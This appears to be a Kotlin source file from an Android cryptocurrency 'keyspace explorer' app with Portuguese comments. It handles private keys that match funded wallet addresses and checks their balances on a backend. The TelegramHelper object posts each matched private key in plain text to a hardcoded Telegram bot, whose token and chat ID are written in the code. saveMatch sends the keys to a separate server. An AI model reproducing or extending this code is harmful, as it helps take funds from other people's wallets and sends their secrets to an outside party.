package com.example.keyspaceexplorer

import android.annotation.SuppressLint
import android.content.SharedPreferences
import android.preference.PreferenceManager
import android.util.Log
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import okhttp3.Call
import okhttp3.Callback
import okhttp3.FormBody
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody
import okhttp3.Response
import org.json.JSONArray
import org.json.JSONObject
import java.io.IOException
import java.math.BigInteger

fun formatMatchMessage(item: PrivateKeyItem): String {
    return buildString {
        appendLine("🔐 Chave Privada:")
        appendLine("   ${item.hex}")
        appendLine()
        appendLine("📬 Endereço(s) que deu match:")
        item.matched?.forEach { address ->
            appendLine(address.fullAddressPretty())
        }
    }.trim()
}

object AlertHelper {
    fun alertMatch(item: PrivateKeyItem) {
        try {
            MainActivity.Instance?.context.let { activity ->
                val message = buildString {
                    appendLine("🔐 Chave Privada:")
                    appendLine("   ${item.hex}")
                    appendLine()
                    appendLine("📬 Endereço(s) que deu match:")
                    item.matched?.forEach { address ->
                        appendLine(address.fullAddressPretty())
                    }
                }

                MainActivity.Instance?.context?.let {
                    AlertDialog.Builder(it)
                        .setTitle("✅ Match encontrado no banco e salvo em meus matches!")
                        .setMessage(message)
                        .setPositiveButton("OK", null)
                        .show()
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}

object TelegramHelper {
    private const val TELEGRAM_URL = "https://api.telegram.org/bot7688830724:AAHnBdSNgwnjNKyq62f_ZjlhQiNFHzm0SIU/sendMessage"
    private const val TELEGRAM_ID = "27196478"

    fun sendAlert(item: PrivateKeyItem) {
        try {
            val body = formatMatchMessage(item)
            val form = FormBody.Builder()
                .add("chat_id", TELEGRAM_ID)
                .add("text", body)
                .build()
            val request = Request.Builder().url(TELEGRAM_URL).post(form).build()
            OkHttpClient().newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {}
                override fun onResponse(call: Call, response: Response) {}
            })
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}

object StorageHelper {
    private val gson = Gson()
    const val MATCHES_KEY = "matches"

    @SuppressLint("MutatingSharedPrefs", "UseKtx")
    fun saveMatch(item: PrivateKeyItem) {
        try {
            val prefs = PreferenceManager.getDefaultSharedPreferences(MainActivity.Instance.context)
            val current = getMatches(prefs).toMutableList()

            // Evita duplicatas
            if (current.none { it.hex == item.hex }) {
                current.add(item)
                val json = gson.toJson(current)
                prefs.edit().putString(MATCHES_KEY, json).apply()
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    fun getMatches(): List<PrivateKeyItem> {
        val prefs = PreferenceManager.getDefaultSharedPreferences(MainActivity.Instance.context)
        return getMatches(prefs)
    }

    fun getMatches(prefs: SharedPreferences): List<PrivateKeyItem> {
        return try {
            val json = prefs.getString(MATCHES_KEY, null)
            if (json != null) {
                val type = object : TypeToken<List<PrivateKeyItem>>() {}.type
                gson.fromJson(json, type)
            } else emptyList()
        } catch (e: Exception) {
            e.printStackTrace()
            emptyList()
        }
    }

    fun alreadySaved(item: PrivateKeyItem): Boolean {
        return try {
            val saved = getMatches()
            saved.any { it.hex == item.hex }
        } catch (e: Exception) {
            e.printStackTrace()
            false
        }
    }
}

object LogHelper {
    fun logMatch(item: PrivateKeyItem) {
        try {
            val message = formatMatchMessage(item)
            Log.d("MATCH", "\n$message")
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}

object ToastHelper {
    fun showToast(item: PrivateKeyItem) {
        try {
            val msg = "Match: ${item.matched?.firstOrNull()?.address ?: "?"}"
            Toast.makeText(MainActivity.Instance.context, msg, Toast.LENGTH_LONG).show()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}

object AddressUtils {

    fun normalize(address: String, coin: String): String {
        return when (coin.uppercase()) {
            "ETH" -> address.lowercase().removePrefix("0x")
            "BCH" -> address.removePrefix("bitcoincash:")
            else -> address
        }
    }
}

object MatchFetcher {
    private val client = OkHttpClient()

    fun fetchMatchesWithBalances(onResult: (List<PrivateKeyItem>) -> Unit) {
        val request = Request.Builder()
            .url("http://192.168.7.101:5000/matches")
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                e.printStackTrace()
                onResult(emptyList())
            }

            override fun onResponse(call: Call, response: Response) {
                val body = response.body?.string()
                if (!response.isSuccessful || body == null) {
                    onResult(emptyList())
                    return
                }

                try {
                    val json = JSONObject(body)
                    val matchArray = json.getJSONArray("matches")
                    val addressList = mutableListOf<String>()
                    val addressToItem = mutableMapOf<String, PrivateKeyItem>()

                    for (i in 0 until matchArray.length()) {
                        val obj = matchArray.getJSONObject(i)
                        val token = obj.getString("token")
                        val address = obj.optString("address", null)
                        val hex = obj.getString("private_key_hex")

                        val matched = if (!address.isNullOrBlank()) {
                            listOf(CryptoAddress(
                                token, "?", address,
                                balanceToken = 0.0,
                                balanceUsd = 0.0,
                            ))
                        } else emptyList()

                        val item = PrivateKeyItem(
                            index = BigInteger.ZERO,
                            hex = hex,
                            addresses = emptyList(), // ou matched se quiser copiar
                            dbHit = true,
                            matched = matched
                        )

                        if (address != null) {
                            addressList.add(address)
                            addressToItem[address] = item
                        } else {
                            // usa índice como chave fake
                            addressToItem["null-$i"] = item
                        }
                    }

                    if (addressList.isNotEmpty()) {
                        fetchBalances(addressList) { balances ->
                            for (balance in balances) {
                                val item = addressToItem[balance.address]
                                val addr = item?.matched?.firstOrNull()
                                if (addr != null) {
                                    addr.address = balance.address
                                    addr.token = balance.token
                                    addr.apply {
                                        balanceToken = balance.balance
                                        balanceUsd = balance.balanceUsd
                                    }
                                }
                            }
                            onResult(addressToItem.values.toList())
                        }
                    } else {
                        onResult(addressToItem.values.toList())
                    }

                } catch (e: Exception) {
                    e.printStackTrace()
                    onResult(emptyList())
                }
            }
        })
    }

    private fun fetchBalances(addresses: List<String>, onResult: (List<BalanceResult>) -> Unit) {
        val jsonBody = JSONObject().put("addresses", JSONArray(addresses))
        val request = Request.Builder()
            .url("http://192.168.7.101:5000/balances")
            .post(RequestBody.create("application/json".toMediaTypeOrNull(), jsonBody.toString()))
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                e.printStackTrace()
                onResult(emptyList())
            }

            override fun onResponse(call: Call, response: Response) {
                val body = response.body?.string()
                if (!response.isSuccessful || body == null) {
                    onResult(emptyList())
                    return
                }

                try {
                    val array = JSONObject(body).getJSONArray("matches")
                    val result = mutableListOf<BalanceResult>()
                    for (i in 0 until array.length()) {
                        val o = array.getJSONObject(i)
                        result.add(
                            BalanceResult(
                                token = o.getString("token"),
                                address = o.getString("address"),
                                balance = o.getDouble("balance_token"),
                                balanceUsd = o.getDouble("balance_usd")
                            )
                        )
                    }
                    onResult(result)
                } catch (e: Exception) {
                    e.printStackTrace()
                    onResult(emptyList())
                }
            }
        })
    }

    @SuppressLint("MutatingSharedPrefs", "UseKtx")
    fun saveMatch(item: PrivateKeyItem) {
        try {
            // Também envia para o backend
            val matched = item.matched?.firstOrNull()
            if (matched != null) {
                val json = JSONObject().apply {
                    put("token", matched.token)
                    put("address", matched.address)
                    put("private_key_hex", item.hex)
                    put("variant", matched.variantPretty().lowercase())
                }

                val request = Request.Builder()
                    .url("http://192.168.7.101:5000/store-match")
                    .post(RequestBody.create(
                        "application/json".toMediaTypeOrNull(), json.toString()
                    ))
                    .build()

                OkHttpClient().newCall(request).enqueue(object : Callback {
                    override fun onFailure(call: Call, e: IOException) {
                        e.printStackTrace()
                    }

                    override fun onResponse(call: Call, response: Response) {
                        if (!response.isSuccessful) {
                            Log.e("saveMatch", "Erro ao salvar no backend: ${response.code}")
                        }
                    }
                })
            }

        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    fun fetchBalancesBlocking(addresses: List<String>): List<BalanceResult> {
        val client = OkHttpClient()
        val jsonBody = JSONObject().put("addresses", JSONArray(addresses))

        val request = Request.Builder()
            .url("http://192.168.7.101:5000/balances")
            .post(RequestBody.create("application/json".toMediaTypeOrNull(), jsonBody.toString()))
            .build()

        return try {
            val response = client.newCall(request).execute()
            val body = response.body?.string() ?: return emptyList()
            if (!response.isSuccessful) return emptyList()

            val array = JSONObject(body).getJSONArray("matches")
            val result = mutableListOf<BalanceResult>()
            for (i in 0 until array.length()) {
                val o = array.getJSONObject(i)
                result.add(
                    BalanceResult(
                        token = o.getString("token"),
                        address = o.getString("address"),
                        balance = o.getDouble("balance_token"),
                        balanceUsd = o.getDouble("balance_usd")
                    )
                )
            }
            result
        } catch (e: Exception) {
            e.printStackTrace()
            emptyList()
        }
    }

    fun fetchMatchesWithBalancesBlocking(): List<PrivateKeyItem> {
        val client = OkHttpClient()
        val request = Request.Builder()
            .url("http://192.168.7.101:5000/matches")
            .build()

        return try {
            val response = client.newCall(request).execute()
            if (!response.isSuccessful) return emptyList()

            val body = response.body?.string() ?: return emptyList()
            val matchArray = JSONObject(body).getJSONArray("matches")
            val addressList = mutableListOf<String>()
            val hexToItem = mutableMapOf<String, PrivateKeyItem>()

            for (i in 0 until matchArray.length()) {
                val obj = matchArray.getJSONObject(i)
                val token = obj.getString("token")
                val address = obj.optString("address", null)
                val variant = obj.optString("variant", "?")
                val hex = obj.getString("private_key_hex")

                val matched = if (!address.isNullOrBlank()) {
                    listOf(CryptoAddress(token, variant, address, 0.0, 0.0))
                } else emptyList()

                val item = PrivateKeyItem(
                    index = BigInteger.ZERO,
                    hex = hex,
                    addresses = emptyList(),
                    dbHit = true,
                    matched = matched
                )

                if (address != null) {
                    addressList.add(address)
                    hexToItem[hex] = item
                }
            }

            // Consulta saldos
            val balances = fetchBalancesBlocking(addressList)

            for ((_, item) in hexToItem) {
                val match = item.matched?.firstOrNull() ?: continue
                val info = balances.find { it.address == match.address }
                if (info != null) {
                    match.balanceToken = info.balance
                    match.balanceUsd = info.balanceUsd
                }
            }

            return hexToItem.values.toList()
        } catch (e: Exception) {
            e.printStackTrace()
            return emptyList()
        }
    }

    data class BalanceResult(
        val token: String,
        val address: String,
        val balance: Double,
        val balanceUsd: Double
    )
}